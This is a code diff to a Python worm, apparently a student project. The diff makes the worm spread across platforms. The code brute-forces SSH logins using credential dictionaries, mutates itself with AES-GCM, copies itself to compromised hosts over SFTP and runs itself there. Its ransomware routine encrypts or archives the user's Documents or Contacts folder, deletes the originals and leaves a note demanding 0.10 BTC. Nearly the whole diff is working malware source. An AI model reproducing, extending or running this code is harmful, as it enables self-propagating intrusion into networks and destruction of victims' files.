@@ -8,7 +8,7 @@ This worm does the following:
     for the next propagation cycle.
 """
 
-import sys, os, base64, uuid, socket, subprocess, threading, traceback, logging
+import sys, os, base64, uuid, socket, re, subprocess, threading, traceback, logging
 from datetime import datetime
 from random import shuffle
 import concurrent.futures
@@ -75,20 +75,22 @@ console_handler.setLevel(logging.INFO)
 console_handler.setFormatter(ColorizedFormatter())
 logger.addHandler(console_handler)
 
-file_handler = logging.FileHandler(filename='/tmp/dmsg.log')
+file_handler = logging.FileHandler(filename=os.path.join(os.path.expanduser("~"), "dmsg.log"))
 file_handler.setLevel(logging.DEBUG)
 file_formatter = logging.Formatter('%(asctime)s - %(message)s')
 file_handler.setFormatter(file_formatter)
 logger.addHandler(file_handler)
 
 # Worm configuration constants
-REMOTE_DIR = "/tmp/default/"
+HOME_DIR = os.path.expanduser("~")
+REMOTE_DIR = "Temp"
 INFECTED_LOG = "infected.log"
 USERNAME_DICT = "username.txt"
 PASSWORD_DICT = "password.txt"
 ALLOWED_SUBNETS = ["192.168.0.0/16", "10.0.0.0/16"]
-BLOCKED_SUBNETS = ["169.254.0.0/16"]
+BLOCKED_SUBNETS = ["127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/20", "224.0.0.0/4"]
 MIN_SUBNET_MASK = 24
+propagation_threads = []
 
 ########################################
 # Polymorphic Engine (AES-GCM Functions)
@@ -155,11 +157,78 @@ def polymorph_file(file_path):
     logger.error(f"Worm file mutated to {new_name}")
     return new_name
 
+###############################################
+# New Helper Functions for OS-Aware Propagation
+###############################################
+
+def detect_remote_os(ssh):
+    """
+    Detect the remote operating system.
+    Tries to run 'uname -s' (works on Linux/Mac). If that fails,
+    assumes the target is Windows.
+    """
+    try:
+        _, stdout, _ = ssh.exec_command("uname -s")
+        remote_os = stdout.read().decode().strip()
+        if remote_os:
+            logger.info(f"Detected remote OS via uname: {remote_os}")
+            if "Linux" in remote_os or "Darwin" in remote_os:
+                return "Linux"
+    except Exception:
+        pass  # If uname fails, assume Windows
+    logger.info("Assuming remote OS is Windows")
+    return "Windows"
+
+def get_remote_home_dir(ssh):
+    """
+    Returns the home directory based on remote OS.
+    """
+    remote_os = detect_remote_os(ssh)
+    try:
+        if remote_os == "Linux":
+            _, stdout, _ = ssh.exec_command("echo $HOME")
+        else:
+            # For Windows, execute the command to echo the USERPROFILE variable.
+            _, stdout, _ = ssh.exec_command("echo %USERPROFILE%")
+        home_dir = stdout.read().decode().strip()
+        if home_dir:
+            return home_dir
+        else:
+            raise ValueError("Empty home directory returned")
+    except Exception as e:
+        logger.error(f"Error retrieving remote home directory: {e}")
+        # Fallback: for Linux use "~" (note this may not work with all SFTP clients)
+        return "~" if remote_os == "Linux" else "%USERPROFILE%"
+
+def remote_path_join(ssh, *parts):
+    """
+    Joins parts of a path using the appropriate separator for the remote OS.
+    It determines the remote OS via detect_remote_os(ssh) and then uses
+    '/' for Linux and '\\' for Windows.
+    """
+    remote_os = detect_remote_os(ssh)
+    if remote_os == "Linux":
+        return "/".join(parts)
+    else:
+        return "\\".join(parts)
+    
+def get_remote_exec_command(ssh, mutated_file):
+    """
+    Constructs the remote execution command for the mutated worm file
+    based on the remote operating system.
+    """
+    remote_os = detect_remote_os(ssh)
+    if remote_os == "Linux":
+        # Use bash syntax (assumes python3 is installed)
+        cmd = f"cd ~/{REMOTE_DIR} && python3 {mutated_file}"
+    else:  # Windows
+        # Use Windows command prompt syntax; /d allows changing drive letters
+        cmd = f'cd /d "%USERPROFILE%\\{REMOTE_DIR}" && python {mutated_file}'
+    return cmd
+
 ###########################################
 # Worm Core (Network Propagation Functions)
 ###########################################
-
-HOME_DIR = f"/home/{os.getlogin()}"
 
 def initiate_worm():
     """Perform scanning, infection, and mutation propagation."""
@@ -198,11 +267,17 @@ def initiate_worm():
         logger.info("Attempting SSH connection...")
         for host in hosts:
             if allowed(IPAddress(host)):
+                #t = threading.Thread(target=connect_via_ssh, args=(host,))
+                #t.start()
+                #propagation_threads.append(t)
                 connect_via_ssh(host)
                 infection_done = True
                 break
         if infection_done:
             break
+
+    #for t in propagation_threads:
+    #    t.join()
 
     if not infection_done:
         if os.environ.get("SELF_MUTATED", "0") == "0":
@@ -213,29 +288,50 @@ def initiate_worm():
             logger.info("No new targets found and already self-mutated once. Terminating propagation.")
             sys.exit(0)
 
+    #cleanup_local()
+
 def deploy_ransomware():
-    """Encrypt and delete documents, then leave a ransom note."""
-    docs_dir = f"{HOME_DIR}/Documents"
-    tar_path = f"{HOME_DIR}/Documents.tar"
-    enc_path = f"{HOME_DIR}/Documents.tar.enc"
-    note_path = f"{HOME_DIR}/openme.txt"
+    """Encrypt and delete documents, then leave an informative note."""
+    note_path = os.path.join(HOME_DIR, "openme.txt")
     if os.path.exists(note_path):
         logger.info("Ransom note exists. Skipping ransomware action.")
         return
-    if not os.path.exists(docs_dir):
-        logger.info("Documents directory not found. Skipping.")
-        return
-    try:
-        subprocess.check_call(["tar", "-cf", tar_path, docs_dir])
-        subprocess.check_call(["openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
-                                 "-in", tar_path, "-out", enc_path, "-k", "cmpt783"])
-        subprocess.check_call(["rm", "-rf", docs_dir])
-        os.remove(tar_path)
-        with open(note_path, "w") as f:
-            f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
-        logger.error("Ransomware operation completed on this host.")
-    except Exception as e:
-        logger.error("Error during ransomware operation: " + str(e))
+    
+    if sys.platform.startswith("win"):
+        docs_dir = os.path.join(HOME_DIR, "Contacts")
+        if not os.path.exists(docs_dir):
+            logger.info("Contacts directory not found. Skipping.")
+            return
+
+        zip_path = os.path.join(HOME_DIR, "Contacts.zip")
+        try:
+            subprocess.check_call(["powershell", "-Command",
+                                   f"Compress-Archive -Path '{docs_dir}' -DestinationPath '{zip_path}'"])
+            subprocess.check_call(["rmdir", "/S", "/Q", docs_dir], shell=True)
+            with open(note_path, "w") as f:
+                f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
+            logger.error("Ransomware operation completed on this host (Windows).")
+        except Exception as e:
+            logger.error("Error during ransomware operation (Windows): " + str(e))
+    else:
+        docs_dir = os.path.join(HOME_DIR, "Documents")
+        if not os.path.exists(docs_dir):
+            logger.info("Documents directory not found. Skipping.")
+            return
+
+        tar_path = os.path.join(HOME_DIR, "Documents.tar")
+        enc_path = os.path.join(HOME_DIR, "Documents.tar.enc")
+        try:
+            subprocess.check_call(["tar", "-cf", tar_path, docs_dir])
+            subprocess.check_call(["openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
+                                     "-in", tar_path, "-out", enc_path, "-k", "cmpt783"])
+            subprocess.check_call(["rm", "-rf", docs_dir])
+            os.remove(tar_path)
+            with open(note_path, "w") as f:
+                f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
+            logger.error("Ransomware operation completed on this host (Linux).")
+        except Exception as e:
+            logger.error("Error during ransomware operation (Linux): " + str(e))
 
 def local_addresses():
     """Retrieve local IPv4 addresses and associated CIDR subnets."""
@@ -243,26 +339,47 @@ def local_addresses():
     ip_list = []
     subnet_list = []
     for interface in interfaces:
-        ifaces = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
-        if ifaces:
-            for iface in ifaces:
-                logger.info(f"Interface found: {iface}")
-                ip_list.append(IPAddress(iface['addr']))
-                subnet_list.append(IPNetwork(iface['addr'] + "/" + iface['netmask']).cidr)
+        addrs = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
+        if addrs:
+            for addr in addrs:
+                logger.info(f"Interface found: {addr}")
+                ip_list.append(IPAddress(addr['addr']))
+                subnet_list.append(IPNetwork(addr['addr'] + "/" + addr['netmask']).cidr)
     return ip_list, subnet_list
 
 def routes():
-    """Parse the system routing table to find network subnets."""
-    routes_raw = subprocess.check_output(["ip", "route"]).decode()
-    routes_lines = routes_raw.split("\n")
-    discovered_networks = []
-    for route in routes_lines:
+    if sys.platform.startswith("win"):
         try:
-            dst_network = IPNetwork(route.split(" ")[0])
-            discovered_networks.append(dst_network)
-        except AddrFormatError:
-            pass
-    return discovered_networks
+            routes_raw = subprocess.check_output(["route", "print", "-4"], shell=True).decode()
+        except Exception as e:
+            logger.error(f"Error running 'route print': {e}")
+            return []
+        discovered = []
+        for route in routes_raw.splitlines():
+            m = re.search(r"^\s*(\d+\.\d+\.\d+\.\d+)\s+(\d+\.\d+\.\d+\.\d+)\s+", route)
+            if m:
+                try:
+                    network = IPNetwork(f"{m.group(1)}/{m.group(2)}")
+                    discovered.append(network)
+                except AddrFormatError:
+                    continue
+        return discovered
+    else:
+        """Parse the system routing table to find network subnets."""
+        try:
+            routes_raw = subprocess.check_output(["ip", "route"]).decode()
+        except Exception as e:
+            logger.error(f"Error running 'ip route': {e}")
+            return []
+        discovered = []
+        for route in routes_raw.splitlines():
+            if route.split()[0] != 'default':
+                try:
+                    network = IPNetwork(route.split()[0])
+                    discovered.append(network)
+                except AddrFormatError:
+                    continue
+        return discovered
 
 def partition_subnet(subnet_list):
     """Split subnets with a mask shorter than MIN_SUBNET_MASK into smaller subnets."""
@@ -369,12 +486,12 @@ def connect_via_ssh(ip):
             logger.info(f"Attempting SSH connection to {ip} with {user}:{passwd}")
             try:
                 ssh.connect(ip, username=user, password=passwd,
-                            timeout=0.5, auth_timeout=0.5, banner_timeout=0.5,
+                            timeout=3, auth_timeout=3, banner_timeout=3,
                             allow_agent=False, look_for_keys=False)
                 logger.error(f"SSH login succeeded on {ip} with {user}:{passwd}")
                 spread(ssh)
-                # After infection, exit so that the new mutated copy takes over
                 sys.exit(0)
+                #return
             except (AuthenticationException, BadHostKeyException):
                 logger.info("SSH authentication failed.")
             except (SSHException, EOFError) as e:
@@ -391,19 +508,21 @@ def spread(ssh):
     if check_remote_infection_marker(ssh):
         logger.error("Remote host already infected. Skipping infection...")
         return
+    
     current_file = sys.argv[0]
     mutated_file = polymorph_file(current_file)
     
     logger.error(f"Transferring mutated worm {mutated_file} via SSH...")
     sftp = ssh.open_sftp()
+    remote_home_dir = get_remote_home_dir(ssh)
     try:
-        sftp.mkdir(REMOTE_DIR)
+        sftp.mkdir(remote_path_join(ssh, remote_home_dir, REMOTE_DIR))
     except IOError:
         pass
     base_dir = os.getcwd()
     for filename in os.listdir(base_dir):
         full_path = os.path.join(base_dir, filename)
-        remote_path = f"{REMOTE_DIR}/{filename}"
+        remote_path = remote_path_join(ssh, remote_home_dir, REMOTE_DIR, filename)
         if os.path.isfile(full_path):
             sftp.put(full_path, remote_path)
         else:
@@ -413,8 +532,10 @@ def spread(ssh):
                 pass
             sftp.put_dir(full_path, remote_path)
     sftp.close()
+
+    remote_cmd = get_remote_exec_command(ssh, mutated_file)
     logger.error("Remote worm deployed. Executing worm via SSH...")
-    t = threading.Thread(target=exec_remote_command, args=(ssh, f"(cd {REMOTE_DIR}; python3 {mutated_file})"))
+    t = threading.Thread(target=exec_remote_command, args=(ssh, remote_cmd))
     t.start()
 
     # Flush logs and exit
@@ -439,11 +560,22 @@ def check_remote_infection_marker(ssh):
     """Check if the target machine already has the worm installed."""
     sftp = ssh.open_sftp()
     try:
-        sftp.chdir(REMOTE_DIR)
+        sftp.chdir(remote_path_join(ssh, get_remote_home_dir(ssh), REMOTE_DIR))
     except IOError:
         return False
     sftp.close()
     return True
+
+def cleanup_local():
+    """Deletes all files in the directory containing the worm."""
+    try:
+        for file_name in os.listdir(os.path.join(HOME_DIR, REMOTE_DIR)):
+            file_path = os.path.join(HOME_DIR, REMOTE_DIR, file_name)
+            os.remove(file_path)
+        os.rmdir(os.path.join(HOME_DIR, REMOTE_DIR))
+        logger.info(f"Deleted directory: {os.path.join(HOME_DIR, REMOTE_DIR)}")
+    except Exception as e:
+        logger.error(f"Error during cleanup: {e}")
 
 def load_entries(filename):
     """Load credential or log entries from a file."""
@@ -463,7 +595,6 @@ def exec_remote_command(ssh, command):
 
 if __name__ == "__main__":
     try:
-        # Run the full propagation cycle on this machine
         initiate_worm()
     except Exception as e:
         traceback.print_exc()
